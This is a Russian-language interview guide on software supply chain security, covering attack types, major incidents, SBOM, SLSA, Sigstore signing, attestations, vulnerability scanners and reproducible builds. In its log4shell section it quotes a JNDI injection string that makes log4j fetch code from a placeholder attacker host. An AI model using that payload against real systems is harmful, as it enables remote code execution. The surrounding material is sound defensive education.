# Вопросы на собеседовании: `Supply Chain Security`

`Software Supply Chain Security` — защита кода, зависимостей, процесса сборки и артефактов от **подмены (tampering) и компрометации**. После инцидентов — **SolarWinds (2020)**, **log4shell (2021)**, **xz utils backdoor (2024)** — тема стала **высшим приоритетом**. Инструменты: **SBOM** (опись компонентов), **SLSA** (фреймворк), **Sigstore/Cosign** (подпись), **Dependabot/Trivy** (сканирование).

## Q1. (!) Что такое supply chain attack?

**Supply chain attack** — это атака на жертву не напрямую, а через **доверенных посредников**: вендоров, зависимости, инструменты сборки, CI/CD. Вместо штурма защищённого периметра атакующий компрометирует то, чему этот периметр уже доверяет.

**Логика атаки:** если организацию не пробить в лоб, её ломают через поставщика. Канал обновлений вендора доставит вредонос **от имени доверенного источника** — а защита его пропустит, потому что подпись и происхождение выглядят легитимными.

**Поверхность атаки** — вредонос можно внедрить на любом этапе пути от исходника до запуска:
```
Source code → Build → Artifact → Distribution → Install → Runtime
     ↑           ↑         ↑           ↑            ↑         ↑
   steal      inject    tamper      MITM        compromise  execute
   secret     malware   binary                  package
```

**Почему это работает** — каждый пункт усиливает следующий:
- Софт неявно доверяет зависимостям, а их тысячи (транзитивные deps), и проверить каждую вручную невозможно.
- Обновления применяются автоматически — доверие к подписи вендора означает, что вредоносный апдейт раскатится без участия человека.
- Компрометация **одной популярной библиотеки** бьёт по всем, кто её тянет — это **тысячи жертв** за одну операцию.
- Обнаружить трудно: вредоносный коммит маскируется под обычное изменение и прячется в потоке легитимных.

**Из реальной жизни:**
- NPM-пакеты с 1M+ загрузок скомпрометированы через украденные учётки мейнтейнеров.
- Образы Docker Hub с зашитыми криптомайнерами.
- Typosquatting в PyPI (`requests` vs `reqeusts`).

**Главное последствие** — эффект множителя: одна компрометация распространяется вниз по цепочке и достаёт сотни организаций, которые саму атакованную библиотеку даже не выбирали осознанно.

## Q2. (!) Известные инциденты supply chain (SolarWinds, log4shell, xz)?

Три громких кейса показывают три разных вектора: компрометацию сборки, уязвимость транзитивной зависимости и многолетнюю социальную инженерию.

**SolarWinds / SUNBURST (дек. 2020) — компрометация build-пайплайна:**
- APT-группа (российская СВР) проникла в систему сборки **SolarWinds Orion** (мониторинг сети).
- Вредоносный код внедрили на этапе сборки, поэтому он попал в обновление, **подписанное легитимным сертификатом SolarWinds** — и проверка подписи у клиентов ничего не заподозрила.
- **18 000+ клиентов** скачали бэкдор; ~100 атаковали активно.
- Жертвы: казначейство США, DHS, Microsoft, FireEye.
- Урок: если скомпрометирован build-пайплайн, подпись не спасает — вредонос подписан валидным ключом.

**log4shell / CVE-2021-44228 (дек. 2021) — уязвимость транзитивной зависимости:**
- RCE в **Apache log4j 2.x**: JNDI-инъекция прямо через сообщение лога.
- Строка `${jndi:ldap://attacker.com/exploit}`, попавшая в любой залогированный текст (имя пользователя, User-Agent), заставляла log4j подтянуть и выполнить чужой код → RCE.
- **CVSS 10.0** — максимальная серьёзность.
- Уязвимость была **повсюду**: Minecraft, iCloud, Steam, миллионы приложений — потому что log4j тянулся транзитивно, и многие даже не знали, что он у них есть.
- Урок: нужен SBOM, чтобы за минуты ответить «есть ли у нас log4j»; скорость выкатки патча критична.

**xz utils backdoor / CVE-2024-3094 (март 2024) — социальная инженерия long-con:**
- Атакующий под именем «Jia Tan» **2+ года** добросовестно контрибьютил в xz utils (библиотека сжатия), выстраивая репутацию.
- Получив права мейнтейнера, вставил **бэкдор** в `liblzma`, который обходил SSH-аутентификацию.
- Затронул unstable-ветки Debian/Ubuntu; **обнаружен случайно** инженером Microsoft — он заметил, что sshd стал медленнее на доли секунды.
- Урок: критичная инфраструктура часто держится на одном уставшем мейнтейнере; доверие к человеку — тоже вектор атаки.

**Ещё два показательных случая:**
- **codecov (2021):** скомпрометирован инструмент измерения покрытия в CI → переменные окружения (секреты) утекли из многих организаций.
- **event-stream (2018):** мейнтейнер передал популярный NPM-пакет другому человеку, который добавил код для кражи Bitcoin-кошельков.

**Итог:** векторами оказываются все три опоры цепочки — процесс сборки, зависимости и **люди**, которые их сопровождают.

## Q3. (!) Типы supply chain attacks?

Векторы удобно сгруппировать по тому, **где** атакующий вмешивается: на входе зависимостей, в аккаунтах, в инфраструктуре сборки/исходников или при распространении.

**Атаки на выбор зависимости (обман разработчика):**

**1. Dependency confusion:** атакующий публикует в публичном реестре пакет с именем вашего приватного — и пакетный менеджер, не различая источники, тянет публичную версию атакующего вместо внутренней. Решение: явные scopes и приоритет внутреннего реестра.

**2. Typosquatting:** пакет с именем, похожим на популярное (`urllib` / `urllib3` / `ur11ib3`), ставится из-за опечатки в команде установки.

**3. Захват заброшенного пакета:** атакующий регистрирует имя пакета, который мейнтейнер удалил или забросил, и подсовывает вредоносную версию под привычным именем.

**Атаки через захват доверенного источника:**

**4. Действия мейнтейнера / protestware:** легитимный мейнтейнер сам добавляет вредоносный код — по политическим мотивам, из-за выгорания или продав права. Пример: `node-ipc` (2022) — мейнтейнер добавил код, удаляющий файлы на российских IP.

**5. Скомпрометированный аккаунт:** украденные учётки npm/PyPI используют для публикации вредоносной версии под доверенным именем. Пример: ua-parser-js, coa, rc (2021).

**6. Спящая атака / long-con:** атакующий годами выстраивает доверие, становится мейнтейнером и только потом внедряет вредонос. Пример: xz (см. Q2).

**Атаки на инфраструктуру:**

**7. Компрометация build-системы:** атакующий проникает в CI, и **подписанный** артефакт уже содержит вредонос. Пример: SolarWinds.

**8. Компрометация репозитория исходников:** push в репозиторий по украденному токену. Пример: Git-сервер PHP (2021) — атакующие запушили бэкдор прямо в php-src.

**Атаки на остальные звенья:**

**9. Уязвимость в upstream:** у транзитивной зависимости есть CVE, которую наследуют все потребители (например, log4shell в любом Java-приложении).

**10. Атака на CDN / зеркало:** подмена артефакта на этапе распространения, между публикацией и установкой.

**Контрмеры** (каждая закрывает свою группу): SBOM и ревью зависимостей — против вредных deps; подпись и SLSA — против компрометации инфраструктуры; закреплённые версии и воспроизводимые сборки — против подмены при распространении.

## Q4. (!) Что такое SBOM?

**SBOM (Software Bill of Materials)** — машиночитаемая опись всех компонентов ПО (прямых и транзитивных): какие библиотеки, каких версий, под какими лицензиями и откуда. По сути это полный список ингредиентов вашего софта.

**Аналогия:** этикетка состава на продукте («содержит: пшеницу, сою, …»), только для приложения — чтобы за секунды узнать, что внутри, не разбирая код.

**Зачем нужен** — главная ценность в скорости ответа на вопрос «а это у нас есть?»:
- **Реакция на уязвимости:** когда вышел log4shell, вопрос был один — «есть ли у нас log4j и где». С SBOM ответ мгновенный, без него — недели ручного аудита.
- **Лицензионный комплаенс:** какие GPL/AGPL затесались в кодовую базу и не нарушаем ли мы условия.
- **Регуляторика:** Executive Order 14028 в США (2021) сделал SBOM обязательным для федерального ПО; EU CRA (2024) идёт в ту же сторону.
- **Due diligence по вендору:** понять, что внутри покупаемого продукта, до сделки.

**Содержимое:**
```json
{
  "component": "spring-core",
  "version": "5.3.20",
  "supplier": "VMware",
  "license": "Apache-2.0",
  "hash": "sha256:abc123...",
  "dependencies": ["spring-jcl:5.3.20", ...]
}
```

**Форматы:**
- **SPDX** (Linux Foundation) — ISO-стандарт.
- **CycloneDX** (OWASP) — с фокусом на безопасность.
- **SWID tags** — более старый, менее распространённый.

**Генерация:** автоматически на этапе сборки, а не вручную — иначе опись устареет к следующему коммиту.

**Глубина:** хороший SBOM включает не только прямые, но и **транзитивные зависимости плюс хеши на уровне файлов** — чтобы знать, какие именно байты реально поставлены, а не только какие версии заявлены.

## Q5. (!) Чем отличаются форматы SBOM — SPDX и CycloneDX?

Это два конкурирующих формата SBOM, разведённые по фокусу: **SPDX — про лицензии и комплаенс, CycloneDX — про безопасность**. Различие родилось из того, кто их создавал и зачем.

**SPDX:**
- Linux Foundation, стандарт **ISO/IEC 5962:2021**.
- Фокус: **лицензирование, комплаенс, метаданные** — вырос из задачи юридического аудита open source.
- Форматы: Tag-Value, JSON, YAML, RDF/XML.
- Глубоко интегрирован с юридическим ревью; в безопасности слабее.

**CycloneDX:**
- Проект OWASP (с 2017).
- Фокус: **безопасность и уязвимости** — изначально затачивался под security-процессы.
- Форматы: JSON, XML, Protobuf.
- Нативная поддержка VEX (Vulnerability Exploitability eXchange) — можно прямо в SBOM отметить, эксплуатируема ли уязвимость.
- Описывает не только библиотеки, но и сервисы, фреймворки, ML-модели, криптографию (варианты: SaaSBOM, MLBOM, CBOM).

**Сравнение:**

| Аспект | SPDX | CycloneDX |
|--------|------|-----------|
| Происхождение | Linux Foundation | OWASP |
| Фокус | Комплаенс/лицензии | Безопасность |
| Возраст | 2011 | 2017 |
| Объём | Многословный | Компактный |
| Экосистема | Силён в FOSS/юр. | Силён в security-тулинге |
| Инструменты | Syft, SPDX tools | Syft, CycloneDX CLI |

**Что выбрать на практике:** в большинстве случаев не выбирают, а **генерируют оба** — это дёшево, потому что один инструмент (`syft`) делает каждый формат одной командой. CycloneDX отдают в security-тулинг, SPDX — юристам и комплаенсу. Так закрываются обе задачи без споров о «единственно правильном» формате.

## Q6. Как генерировать SBOM?

SBOM почти всегда генерируют автоматически в CI: либо плагином под конкретный язык (точнее знает граф зависимостей), либо универсальным сканером вроде Syft (работает поверх любого проекта или образа).

**Инструменты под конкретные языки:**

**Java (Maven):**
```xml
<plugin>
  <groupId>org.cyclonedx</groupId>
  <artifactId>cyclonedx-maven-plugin</artifactId>
</plugin>
```
`mvn cyclonedx:makeAggregateBom` → `target/bom.json`

**Node.js:**
```bash
npm sbom --sbom-format=cyclonedx  # npm 10+
# or:
npx @cyclonedx/cyclonedx-npm --output-file sbom.json
```

**Python:**
```bash
cyclonedx-py --format json -o sbom.json
```

**Go:**
```bash
cyclonedx-gomod mod -output sbom.json
```

**Универсальный: Syft (Anchore):**
```bash
syft dir:. -o cyclonedx-json > sbom.json
syft image:myapp:1.0 -o spdx-json > sbom.json
```

**Образы контейнеров:**
```bash
# Docker (Docker 23+)
docker sbom myapp:1.0

# Buildx builds with SBOM attestation
docker buildx build --sbom=true --push ...
```

**В CI/CD (GitHub Actions):**
```yaml
- uses: anchore/sbom-action@v0
  with:
    format: cyclonedx-json
    output-file: sbom.json
```

**Что делать с готовым SBOM:** сохранить его как артефакт сборки и приложить к релизу, а также пушить на сервер dependency-track. Тогда при появлении новой CVE система сама сопоставит её с уже выпущенными SBOM и подсветит затронутые релизы — мониторинг становится непрерывным, а не разовым.

## Q7. (!) Что такое SLSA framework?

**SLSA (Supply-chain Levels for Software Artifacts, читается «salsa»)** — фреймворк от Google/Linux Foundation, задающий **уровни зрелости безопасности build-пайплайна**. Главная цель — дать проверяемую гарантию, что артефакт **собран ровно так, как заявлено**, и его не подменили по пути.

**Какие угрозы закрывает** — целостность на трёх участках цепочки:
- **Целостность исходников:** подмена коммитов, push по украденным учёткам.
- **Целостность сборки:** вредоносный инструмент сборки, угон соседней (параллельной) сборки.
- **Целостность распространения:** подменённые бинарники на зеркале.

**Ключевые понятия** — на них держится вся проверяемость:
- **Provenance** — подписанные метаданные о том, **где, как и кем** собран артефакт.
- **Attestations** — подписанные утверждения о факте («сборка прошла тесты», «просканировано на CVE»).
- **Доверенные сборщики (builders)** — изолированный, аудируемый CI, которому можно верить как источнику provenance.

**Чего SLSA не делает** (важно, чтобы не переоценить):
- Не гарантирует качество и корректность самого кода — это отдельная задача.
- Не отвечает за runtime-безопасность.
- Не предотвращает баги и уязвимости в зависимостях — только подтверждает честность сборки.

**Где внедрено:** внутри Google, в GitHub Actions (есть билдер уровня SLSA L3), в Kubernetes.

**Версия:** 1.0 выпущена в 2023.

## Q8. (!) Что требует каждый уровень SLSA (L1-L4)?

Уровни идут по нарастанию доверия к сборке: от «процесс просто задокументирован» до «provenance невозможно подделать». Каждый следующий закрывает более изощрённую атаку.

**L1 — задокументированный процесс сборки:**
- Есть воспроизводимый скрипт сборки.
- Provenance генерируется автоматически.
- Минимальный порог входа; почти не защищает, но даёт отправную точку.

**L2 — размещённая (hosted) сборка:**
- Код в системе контроля версий.
- Сборка идёт на размещённом build-сервисе (GitHub Actions, CircleCI), а не на ноутбуке разработчика.
- Provenance подписан.
- Защищает от случайной и непрофессиональной подмены, но не от целевой атаки на сам CI.

**L3 — усиленная (hardened) сборка:**
- **Изолированный сборщик** — соседние сборки не могут повлиять на вашу.
- **Неподделываемый provenance** за счёт эфемерной identity (OIDC): разработчик физически не может сфабриковать метаданные.
- Источник и build-платформа **принудительно проверяются**, обойти проверку нельзя.
- Пример: GitHub Actions с `slsa-github-generator`.

**L4 — изначально самый строгий (упразднён в 1.0):**
- Ревью всех изменений минимум двумя людьми.
- Герметичные и воспроизводимые сборки.
- Оказался строже, чем большинство организаций готовы поддерживать на практике — поэтому его убрали.

**Что изменилось в SLSA 1.0 (2023):**
- Стандартизирован только **Build track** (Source- и Dependency-tracks ещё в работе).
- Уровни сократили до Build L1, L2, L3.
- L4 убрали — сделали ставку на реалистичное внедрение, а не на недостижимый идеал.

**Прагматичный путь внедрения:**
1. **L1** — несколько дней.
2. **L2** — перенести сборки в доверенный CI и начать подписывать артефакты.
3. **L3** — подключить SLSA-генератор и принудительно проверять provenance.

**Сторона потребителя:** перед деплоем артефакт прогоняют через `slsa-verifier`, который сверяет provenance с ожидаемым репозиторием и сборщиком.

## Q9. (!) Зачем подписывать artifacts?

Подпись артефакта (JAR, Docker-образа, бинарника) приватным ключом даёт потребителю способ проверить публичным ключом, что артефакт пришёл от заявленного издателя и не был изменён по дороге. Без этого нельзя отличить настоящий релиз от подделки.

**Что гарантирует подпись:**
- **Подлинность:** артефакт действительно от того издателя, что заявлен.
- **Целостность:** после подписи в нём ничего не меняли.
- **Неотказуемость:** издатель не может отрицать, что подписал именно это.

**Что становится возможным без подписи** — все три атаки сводятся к подмене в пути:
- MITM: пакет подменяют при доставке.
- Скомпрометированное зеркало раздаёт вредонос вместо оригинала.
- Отравление CDN или кеша.

**Где это уже работает:**
- **Apt:** GPG-подписи на `.deb`-пакетах; `apt` проверяет их перед установкой.
- **Maven Central:** GPG-подписи на JAR обязательны для публикации.
- **Docker:** подписи Notary / Cosign на образах.
- **npm:** подписи внедряются постепенно.

**Традиционная боль подписи — управление ключами:**
- Где хранить приватный ключ и как его ротировать.
- Компрометация приватного ключа = катастрофа: атакующий подпишет что угодно вашим именем.
- Трение для разработчика: подписывать вручную утомительно, автоматизировать — отдельная работа.

**Современный ответ на эту боль:** **keyless**-подпись (Sigstore), где долгоживущего ключа просто нет.

**Ключевой момент — подпись без проверки бесполезна:** сам по себе подписанный артефакт ничего не даёт, если его никто не верифицирует. Проверку нужно делать принудительно в deploy-пайплайне:
```bash
cosign verify --certificate-identity=... --certificate-oidc-issuer=... image:tag
```

## Q10. (!) Sigstore и Cosign?

**Sigstore** — проект Linux Foundation (2021), дающий **бесплатную keyless-подпись артефактов**. Поддерживается Google, RedHat, GitHub. Его задача — убрать главную проблему классической подписи (хранение долгоживущего ключа), привязав подпись к OIDC-identity, а не к файлу-ключу.

**Из чего состоит:**
- **Cosign** — CLI, через который и подписывают, и проверяют (точка входа для разработчика).
- **Fulcio** — центр сертификации (CA), выпускающий короткоживущие сертификаты на 10 минут.
- **Rekor** — публичный transparency-лог: append-only и аудируемый, фиксирует каждую подпись.

**Как это связано:** Cosign запрашивает у Fulcio эфемерный сертификат под вашу OIDC-identity, подписывает им артефакт и кладёт запись в Rekor.

**Архитектура:**
```
Developer
  ↓ "sign"
OIDC token (Google/GitHub/Microsoft)
  ↓ (проверяет identity)
Fulcio CA → ephemeral cert (valid 10 min)
  ↓ signs artifact
Cosign → uploads signature + cert
  ↓
Rekor (transparency log) ← immutable record
```

**Преимущества:**
- **Нет долгоживущих ключей** — красть и компрометировать попросту нечего.
- **Identity = OIDC** — подпись привязана к email разработчика или GitHub-репозиторию, а не к секретному файлу.
- **Аудируемость** — каждая подпись видна в логе Rekor.
- **Бесплатно** — это публичный сервис.

**Cosign — подпись образа:**
```bash
cosign sign --yes ghcr.io/myorg/app:1.0
# Opens browser → sign in with Google/GitHub
# Cert issued, artifact signed, entry в Rekor
```

**Проверка:**
```bash
cosign verify \
  --certificate-identity=https://github.com/myorg/build.yml@refs/heads/main \
  --certificate-oidc-issuer=https://token.actions.githubusercontent.com \
  ghcr.io/myorg/app:1.0
```

**Зачем проверять identity, а не просто «наличие подписи»:** убедитесь, что `certificate-identity` совпадает с ожидаемым путём вашего GitHub-workflow. Только это гарантирует, что артефакт собран **вашим** CI, а не подписан атакующим через свою валидную (но чужую) OIDC-identity.

## Q11. Как работает keyless-подпись (Fulcio, Rekor)?

**Keyless-подпись** обходится без долгоживущего приватного ключа: ключ создаётся на лету, живёт ~10 минут и уничтожается. Так снимается главный риск классической подписи — кражу постоянного ключа.

**Как это работает по шагам:**

1. **Разработчик аутентифицируется** через OIDC (SSO-identity).
2. **Fulcio** (CA) проверяет OIDC-токен и выпускает X.509-сертификат, привязывающий эту identity к свежесгенерированной эфемерной паре ключей.
3. **Cosign** подписывает артефакт эфемерным приватным ключом.
4. Подпись, сертификат и запись о ней в Rekor сохраняются.

**Почему это безопасно:** эфемерный ключ уничтожается сразу после подписи. Даже если его украсть, он истекает за 10 минут — окно атаки ничтожно.

**Fulcio (CA):**
- Публичный центр сертификации под управлением Linux Foundation.
- Выпускает сертификат, связывающий identity (email / subject) с публичным ключом.
- Якорь доверия — корневой сертификат Sigstore.

**Rekor (transparency-лог):**
- Append-only дерево Меркла, как в Certificate Transparency.
- Фиксирует каждую подпись и доступен для публичных запросов.
- Не даёт задним числом «отозвать публикацию»: благодаря timestamp в неизменяемом логе ретроспективную подмену видно.

**Как проверить подпись, когда приватного ключа уже нет:**
- Сертификат короткоживущий, поэтому проверяющий сверяет цепочку сертификатов до корня Sigstore.
- В Rekor находится запись с timestamp, подтверждающая, что подпись сделана в период действия сертификата.

**Пример:**
```bash
# Identity from GitHub Actions workflow
cosign sign-blob --yes artifact.tar.gz  # no key file!
```

**Главный выигрыш:** исчезает задача «храни приватный ключ надёжно» — ключ вообще не существует за пределами эфемерного CI-джоба, а значит, и компрометировать нечего.

## Q12. Что такое in-toto attestations?

**in-toto** — фреймворк для **структурированных подписанных утверждений** об артефакте. Если подпись говорит лишь «это от меня», то attestation говорит «и вот что я об этом ровно знаю»: что код отревьюен, тесты прошли, CVE не найдены.

**Attestation** — это подписанный JSON следующего вида:
```json
{
  "subject": [{"name": "myapp", "digest": {"sha256": "abc123..."}}],
  "predicateType": "https://slsa.dev/provenance/v1",
  "predicate": {
    "buildDefinition": {...},
    "runDetails": {
      "builder": {"id": "https://github.com/actions/runner"},
      "metadata": {"invocationID": "..."}
    }
  }
}
```

**Predicates — типы утверждений** (`predicateType` задаёт, о чём именно говорит attestation):
- `slsa-provenance` — происхождение сборки.
- `cyclonedx` — приложенный SBOM.
- `vuln` — результат сканирования уязвимостей.
- `test` — тесты пройдены.
- `policy` — соответствие кастомной политике.

**Поток** — на каждом этапе пайплайна вешается своя attestation, и они накапливаются на артефакте:
```
Source commit
  ↓ (attest: code reviewed by X)
Build
  ↓ (attest: SLSA provenance)
Test
  ↓ (attest: tests passed)
Scan
  ↓ (attest: no critical CVEs)
Deploy
  ↓ (policy checks all attestations)
```

**Принуждение (enforcement):** admission controller (Kyverno, Gatekeeper) на входе в кластер блокирует деплой образа, у которого нет требуемых attestations — так утверждения превращаются из информации в реальный барьер.

**Пример (Cosign attest):**
```bash
cosign attest --predicate sbom.json --type cyclonedx image:tag
cosign attest --predicate scan.json --type vuln image:tag
```

**Проверка:**
```bash
cosign verify-attestation --type cyclonedx --certificate-identity=... image:tag
```

**Как складывается цепочка доверия:** потребитель описывает политику — какие predicates и от каких именно сборщиков обязаны присутствовать. Артефакт считается доверенным, только если набор attestations этой политике удовлетворяет.

## Q13. (!) Чем различаются Dependabot и Renovate?

Оба инструмента делают одно и то же — автоматически открывают PR на обновление зависимостей, в том числе по security-алертам. Разница в философии: **Dependabot выбирают за нулевую настройку внутри GitHub, Renovate — за гибкость на больших и разнородных репозиториях**.

**Dependabot (GitHub):**
- Встроен в GitHub и бесплатен для всех репозиториев.
- Конфиг — `.github/dependabot.yml`.
- По умолчанию один PR на одну зависимость.
- Security advisories берёт из GitHub Advisory Database.
- Группировка обновлений (с v2).
- Поддержка: npm, Maven, pip, Cargo, Go modules, Gradle, NuGet, composer, Docker, GitHub Actions.

**Renovate (Mend):**
- Open source; работает self-hosted или в облаке.
- Сильно настраиваемее: пресеты, regex, кастомные менеджеры.
- Гибче группировка и стратегии merge.
- Покрывает больше менеджеров (Helm, Terraform, манифесты Kubernetes).
- Настраиваемый **auto-merge** — например, автослияние патч-обновлений после зелёного CI.

**Сравнение:**

| Аспект | Dependabot | Renovate |
|--------|------------|----------|
| Настройка | Нулевая (GitHub) | Добавить бота/workflow |
| Конфиг | Простой YAML | Богатый JSON |
| Группировка | Базовая | Мощная |
| Кастомные менеджеры | Ограниченно | Regex-кастом |
| Auto-merge | Менее гибкий | Гибкий |
| Расписание | Фиксированная частота | Cron-стиль |
| Экосистемы | Распространённые | Шире |

**Когда что выбирать:**
- **Dependabot** — дефолт для GitHub: малые и средние репозитории, где важна простота.
- **Renovate** — большой монорепо, потребность в тонкой кастомизации, GitLab, многоязычный стек.

**Рекомендации (одинаковы для обоих):**
- Включить security-обновления — авто-PR сразу при появлении CVE.
- Версионные обновления планировать раз в неделю, чтобы не тонуть в ежедневном шуме PR.
- Группировать minor/patch-обновления — меньше PR на ревью.
- CI обязан проходить до merge, иначе автообновление само станет источником поломок.

## Q14. (!) Trivy, Snyk, Grype — сравнение?

Все три — сканеры уязвимостей, но занимают разные ниши: **Trivy — бесплатный «комбайн» для CI, Snyk — платный продукт с глубокими интеграциями и SAST, Grype — узкий быстрый сканер в паре с Syft**.

**Trivy (Aqua Security):**
- **Бесплатный, open source.**
- Сканирует широко: образы контейнеров, файловые системы, git-репозитории, кластеры K8s, SBOM, IaC (Terraform), секреты.
- Быстрый и дружелюбный к CI (умеет SARIF для GitHub).
- Де-факто лидер среди open source — чаще всего ставят именно его.

**Snyk:**
- **Коммерческий** (бесплатный тариф ограничен).
- Сканирует код (SAST), зависимости, контейнеры, IaC — единственный из трёх с полноценным анализом исходного кода.
- Богатые подсказки по исправлению, вплоть до авто-PR.
- Проприетарная БД уязвимостей, часто опережающая публичные.
- Глубокие интеграции: IDE, CI, комментарии прямо в PR.

**Grype (Anchore):**
- Бесплатный, open source.
- Узкий фокус — **только сканирование уязвимостей** по SBOM и образам.
- Работает в паре с **Syft** (тот генерирует SBOM, Grype его проверяет).
- Простой и быстрый.

**Сравнение:**

| Аспект | Trivy | Snyk | Grype |
|--------|-------|------|-------|
| Лицензия | Бесплатный | Коммерческий | Бесплатный |
| БД CVE | NVD, OSV, GHSA | Проприетарная + публичные | NVD, GHSA |
| Охват | Широкий (IaC, секреты, SBOM) | Широкий (плюс SAST) | Узкий (уязвимости) |
| Подсказки по фиксу | Базовые | Богатые | Базовые |
| Генерация SBOM | Да | Нет | Нет (нужен Syft) |
| Плагины IDE | Ограниченно | Богато | Нет |

**Типичный стек:**
- **Dev**: Snyk (богатая интеграция с IDE) или Trivy
- **CI**: Trivy (бесплатный, быстрый)
- **Registry**: сканирование Trivy / ECR scan
- **Runtime**: Falco + Kubescape

**Ложные срабатывания** есть у всех сканеров: CVE в зависимости не всегда достижима в вашем коде. VEX (CycloneDX) позволяет один раз пометить такую находку как «не эксплуатируемо» и не разбирать её повторно в каждом отчёте.

## Q15. Чем отличаются базы CVE и GHSA?

Это две базы данных уязвимостей с разной ролью: **CVE — глобальный канонический идентификатор, GHSA — более быстрая и подробная база GitHub**. Они не конкуренты, а дополняют друг друга и связываются по ID.

**CVE (Common Vulnerabilities and Exposures):**
- Ведёт **MITRE**, финансируется DHS США.
- ID вида `CVE-2021-44228` (log4shell) — единый адрес уязвимости, на который ссылаются все.
- Анализ и оценку добавляет **NVD** (National Vulnerability Database) от NIST.
- Минус — задержка: между раскрытием и присвоением CVE проходят дни или недели.

**GHSA (GitHub Security Advisories):**
- База, которую ведёт GitHub; ID вида `GHSA-xxxx-xxxx-xxxx`.
- Часто **появляется раньше CVE** — мейнтейнеры публикуют advisory у себя сразу, не дожидаясь MITRE.
- Богатые метаданные: затронутые версии, патчи, ссылки.
- При присвоении сопоставляется со своим CVE.

**OSV (Open Source Vulnerabilities):**
- Унифицированный машиночитаемый формат от Google (JSON), API на `osv.dev`.
- Агрегирует разрозненные источники: GHSA, PyPI, npm, RustSec, GSD — чтобы сканеру не ходить в каждую базу отдельно.

**Что используют сканеры:**
- Dependabot → GHSA (нативно для GitHub).
- Trivy → NVD + GHSA + OSV + источники под конкретные языки.
- Snyk → проприетарная база плюс публичные.

**Почему ID нужно сопоставлять:** одна и та же уязвимость может иметь и GHSA, и CVE, и advisory вендора. Инструменты дедуплицируют их, чтобы не показывать трижды.

**Серьёзность — CVSS score (0–10):** вычисляется NVD или вендором. Но **CVSS показывает абстрактную тяжесть, а не эксплуатируемость в вашем контексте** — для этого и нужен VEX.

**CVSS 4.0 (2023):** улучшен, но внедряется медленно; на практике пока доминирует CVSS 3.1.

## Q16. (!) Что такое воспроизводимые сборки (reproducible builds)?

**Reproducible build** — это сборка, в которой одни и те же исходники всегда дают **байт-в-байт идентичный** бинарник, независимо от того, когда, где и кто его собрал. Это превращает доверие в проверяемый факт.

**Зачем это нужно:**
- **Независимая проверка:** любой может пересобрать проект и сравнить хеш с опубликованным — совпало, значит бинарнику можно верить, не доверяя слепо вендору.
- **Обнаружение подмены:** будь сборка SolarWinds воспроизводимой, внедрённый в неё код дал бы расхождение хеша и был бы пойман.
- Воспроизводимость — составная часть **SLSA Level 4**.

**Почему это сложно — источники недетерминизма:**
- Timestamps, зашиваемые в артефакты.
- Случайные ID (UUID).
- Абсолютные пути сборки (`/home/user/project` vs `/builds/project`).
- Недетерминированный порядок параллельной компиляции.
- Локаль и часовой пояс (например, сортировка строк по локали).
- Разные версии компилятора.

**Как с этим бороться:**
- **`SOURCE_DATE_EPOCH`** — env-переменная, фиксирующая timestamp вместо «времени сборки».
- Стабильная (детерминированная) сортировка вывода.
- Зачистка абсолютных путей.
- Закреплённая версия компилятора и детерминированные флаги.

**Инструменты:**
- **reproducible-builds.org** — стандарт + инструменты
- **diffoscope** — глубокий diff двух бинарников
- **Debian reproducible builds** — 96%+ пакетов Debian воспроизводимы
- **Nix** — спроектирован под воспроизводимость

**По языкам:**
- Go — в основном воспроизводим (с 1.10)
- Rust — воспроизводим с усилиями
- Java JAR — требует аккуратности (timestamps в ZIP)

**Из реальной жизни:** Bitcoin Core и Tor воспроизводимы — несколько независимых разработчиков пересобирают релиз и сверяют хеши, так что подмена одного из них не пройдёт незамеченной.

**Важное ограничение:** воспроизводимость гарантирует честность **сборки**, но не **исходников**. Если вредонос лежит уже в коде, он будет воспроизводимо компилироваться в каждый бинарник — это защищает от xz-сценария Q2 не больше, чем от любой другой подмены исходника.

## Q17. Что такое герметичные сборки (Bazel, Nix)?

**Hermetic build** — сборка, которая читает **только явно объявленные входы** (исходники плюс перечисленные deps): без доступа к сети, без опоры на состояние системы, без неявных зависимостей. Всё, что нужно для сборки, перечислено заранее.

**Чем отличается от воспроизводимой** (часто путают):
- Reproducible — про **выход**: одни и те же байты на выходе.
- Hermetic — про **вход**: все входы полностью объявлены.
- Связь односторонняя: герметичность помогает добиться воспроизводимости, но воспроизводимый билд возможен и без герметичности.

**Зачем это нужно:**
- **Конец «у меня работает»** — системные библиотеки не просачиваются в сборку, окружение сборщика перестаёт влиять на результат.
- **Корректный кеш** — раз входы объявлены полностью, при их неизменности кешированный вывод заведомо валиден.
- **Безопасность** — нет сети во время сборки, значит нельзя подтянуть вредоносную зависимость прямо на этапе билда.
- Требуется для **SLSA L3+**.

**Инструменты:**

**Bazel:**
- Система сборки от Google (для Java, Go, C++, Python)
- Сборки в песочнице: воркеры в chroot/контейнерах
- Объявленные deps в `BUILD`-файлах
- Удалённый кеш + удалённое выполнение

**Nix:**
- Функциональный пакетный менеджер
- `nix build` выполняется в песочнице, детерминирован
- Воспроизводим за счёт криптографических хешей входов
- Чистые функции: `drv(inputs) → output`

**Другие:**
- **Buck** (Meta) — как Bazel
- **Pants** (Toolchain)

**Практическая сложность:**
- Перевести существующий Makefile-проект на герметичную сборку — большой объём работы.
- На greenfield-проекте проще: Bazel/Nix внедряют с самого начала.

**Когда оправдано (ROI):**
- Огромный монорепо (Google, Meta) — необходимость: герметичность даёт корректный кеш с 90%+ попаданий, что окупает любую настройку.
- Маленький репозиторий — избыточно: затраты на внедрение не отбиваются.

## Q18. Что такое provenance (кто и что собрал)?

**Provenance** — подписанные метаданные о **происхождении** артефакта: из какого коммита, каким сборщиком, когда и в каком окружении он собран. Это паспорт сборки, по которому можно доказать «этот бинарник родился именно здесь».

**Схема SLSA Provenance (v1):**
```json
{
  "buildDefinition": {
    "buildType": "https://github.com/slsa-framework/slsa-github-generator/generic@v1",
    "externalParameters": {
      "source": "git+https://github.com/myorg/myrepo@sha1:abc123"
    },
    "resolvedDependencies": [...]
  },
  "runDetails": {
    "builder": {"id": "https://github.com/actions/runner"},
    "metadata": {
      "invocationID": "https://github.com/myorg/myrepo/actions/runs/1234",
      "startedOn": "2024-01-15T10:00:00Z",
      "finishedOn": "2024-01-15T10:05:00Z"
    }
  }
}
```

**Зачем:**
- **Доверие:** утверждение «этот JAR собран нашим GitHub Actions из коммита X» становится проверяемым, а не словесным.
- **Реакция на инцидент:** если библиотека скомпрометирована, по provenance находят все артефакты, которые на неё ссылаются.
- **Неподделываемость на SLSA L3+:** provenance подписывает сам сборщик, разработчик не может сфабриковать его задним числом.

**Кто генерирует:**
- GitHub Actions — официальный action `slsa-github-generator`.
- GitLab — собственный provenance с 2023.
